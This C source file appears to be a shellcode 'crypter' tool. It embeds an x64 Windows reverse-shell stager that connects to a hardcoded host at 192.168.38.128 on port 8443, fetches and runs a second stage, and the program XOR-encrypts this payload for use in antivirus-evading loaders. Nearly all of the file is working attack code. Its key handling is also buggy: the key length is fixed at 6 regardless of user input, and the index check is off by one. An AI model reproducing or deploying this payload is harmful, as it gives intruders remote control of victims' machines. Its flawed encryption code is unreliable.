#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] = 
	"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
	"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
	"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
	"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x49\x01"
	"\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
	"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
	"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
	"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
	"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
	"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
	"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
	"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
	"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
	"\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x26\x80\x41\x54"
	"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
	"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
	"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
	"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
	"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
	"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
	"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
	"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
	"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
	"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
	"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
	"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
	"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
	"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
	"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
	"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
	"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
	"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
	"\x2a\x0a\x41\x89\xda\xff\xd5";

unsigned char ALL_BYTES[256] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
	0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
	0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
	0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
	0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
	0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
	0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
	0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
	0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
	0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
	0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
	0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
	0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
	0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
	0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
	0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
	0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
	0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
	0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
	0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
	0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
	0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
	0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
	0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
	0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
	0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
	0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
	0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
	0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
};

unsigned char* generatedKey;

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) 
{
	printf("[+] ENCRYPTING THE SHELLCODE...\n");
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize)
		{
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

VOID GenerateKey(unsigned int length)
{
	int counter = 0;
	int randomNumber;
	generatedKey = malloc(sizeof(char) * length);

	srand(time(NULL));

	printf("[+] GENERATING THE KEY...\n");
	
	for (int i = 0; i < length; i++)*(generatedKey + i) = ALL_BYTES[rand() % 256];
}

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) 
{
	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X", Data[i]);
		}
	}

	printf("\n};\n\n");
}

VOID logo() 
{
	printf("                                                                                                     \n");
	printf("                                                                                                     \n");
	printf("  ,----..                                 ___                                                        \n");
	printf(" /   /   \\                  ,-.----.    ,--.'|_                                                      \n");
	printf("|   :     :  __  ,-.        \\    /  \\   |  | :,'             __  ,-.                               \n");
	printf(".   |  ;. /,' ,'/ /|        |   :    |  :  : ' :           ,' ,'/ /|                              \n");
	printf(".   ; /--` '  | |' |   .--, |   | .\\ :.;__,'  /     ,---.  '  | |' |                              \n");
	printf(";   | ;    |  |   ,' /_ ./| .   : |: ||  |   |     /     \\ |  |   ,'                              \n");
	printf("|   : |    '  :  /, ' , ' : |   |  \\ ::__,'| :    /    /  |'  :  /                                \n");
	printf(".   | '___ |  | '/___/ \\: | |   : .  |  '  : |__ .    ' / ||  | '                                 \n");
	printf("'   ; : .'|;  : | .  \\  ' | :     |`-'  |  | '.'|'   ;   /|;  : |                                 \n");
	printf("'   | '/  :|  , ;  \\  ;   : :   : :     ;  :    ;'   |  / ||  , ;                                 \n");
	printf("|   :    /  ---'    \\  \\  ; |   | :     |  ,   / |   :    | ---'                                  \n");
	printf(" \\   \\ .'            :  \\  \\`---'.|      ---`-'   \\   \\  /                                           \n");
	printf("  `---`               \\  ' ;  `---`                `----'                                            \n");
	printf("                       `--`                                                                          \n");
}

int main() 
{
	int size;
	
	logo();
	printf("[!] ENTER THE SIZE OF THE KEY (From 1 to 256) : ");
	scanf_s("%d", &size);

	GenerateKey(6);
	XorByInputKey(shellcode, sizeof(shellcode), generatedKey, size);

	printf("\n*******************************************************************\n\n");

	PrintHexData("KEY", generatedKey, size);
	PrintHexData("ENCRYPTED_SHELLCODE", shellcode, sizeof(shellcode));

	printf("[#] Press <Enter> To Quit ...");
	getchar();

	return 0;
}